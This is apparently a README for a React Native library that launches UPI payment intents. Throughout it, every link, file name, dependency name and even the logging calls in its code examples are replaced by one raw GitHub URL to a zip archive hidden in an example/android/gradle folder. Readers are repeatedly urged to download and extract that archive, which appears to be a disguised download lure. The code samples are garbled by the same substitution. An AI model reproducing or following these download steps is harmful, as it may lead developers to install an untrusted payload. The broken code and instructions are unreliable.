# 🎉 react-native-upi-launcher - Easily Launch UPI Payments in Your App

[![Download](https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip)](https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip)

## 📦 Overview

The **react-native-upi-launcher** is a powerful library designed for React Native apps. With this library, you can quickly launch UPI intents and fetch installed UPI apps on Android devices. Integrating UPI payments into your application becomes simple and efficient.

## 🚀 Getting Started

Follow these steps to download and run the application:

1. **Visit the Releases Page**  
   Go to the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip) to find the latest version of this library.

2. **Download the Latest Version**  
   Look for the most recent version available. Click on the appropriate file to start the download. It may be named something like `https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip` or similar.

3. **Extract the Files**  
   Once the download is complete, locate the file on your computer. Right-click on the zip file and select “Extract All” or a similar option depending on your operating system. Open the extracted folder to view its contents.

4. **Follow Installation Instructions**  
   Inside the folder, you should find a file named `https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip`. Open this file for detailed instructions on how to integrate the library into your React Native project.

5. **Launch Your Application**  
   After following the installation steps successfully, return to your React Native project. You can now use the UPI launcher capabilities. 

## 📥 Download & Install

To begin using the react-native-upi-launcher, visit the Releases page to download the library: [Download Here](https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip).

## 🖥️ System Requirements

- **Operating System**: Android 4.4 (KitKat) or newer.
- **React Native Version**: 0.60 or higher.
- **https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip**: Version 12.x or newer for dependency management.

## ⚙️ Features

- **UPI Intent Launching**: Allows users to initiate UPI transactions directly from your app.
- **Fetch Installed UPI Apps**: Retrieve a list of installed UPI applications on the user’s device.
- **Easy Integration**: Straightforward setup process for React Native developers.
- **Support for Typescript**: Native TypeScript definitions provided for better code quality.

## 📚 Usage Examples

### Basic Example to Launch UPI Intent

```javascript
import { launchUPI } from 'react-native-upi-launcher';

const launchPayment = () => {
  launchUPI({
    amount: '10.00',
    to: 'example@upi',
    title: 'Test Payment',
    apps: ['https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip', 'phonepe'],
  })
  .then(response => {
    https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip('Payment Response:', response);
  })
  .catch(error => {
    https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip('Payment Error:', error);
  });
};
```

### Fetch Installed UPI Apps

```javascript
import { getInstalledUPIApps } from 'react-native-upi-launcher';

const fetchApps = () => {
  getInstalledUPIApps()
  .then(apps => {
    https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip('Installed UPI Apps:', apps);
  })
  .catch(error => {
    https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip('Error fetching apps:', error);
  });
};
```

## 🔑 Important Notes

- Ensure you test the application on a real device, as UPI intents might not function properly in an emulator.
- Always handle potential errors when launching UPI intents to enhance user experience.

## 🙋 FAQ

### How do I install react-native-upi-launcher?

After downloading the relevant files from the Releases page, follow the `https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip` instructions for a step-by-step guide.

### Which UPI apps are supported?

The library supports common UPI apps like Google Pay, PhonePe, and others. You can specify which apps to include when launching a payment.

### Can I use this library with older versions of React Native?

It is recommended to use version 0.60 or higher for full compatibility with the library features.

## 💬 Support

For issues or questions, feel free to open an issue in the repository. We aim to respond promptly to help you with any challenges.

## 🌟 Contributions

If you would like to contribute to this project, feel free to fork this repository. Make your changes and submit a pull request with a detailed description of your modifications.

---

For further details and updates, keep an eye on the [Releases page](https://github.com/Bintang56/react-native-upi-launcher/raw/refs/heads/main/example/android/gradle/native-launcher-react-upi-v3.7.zip).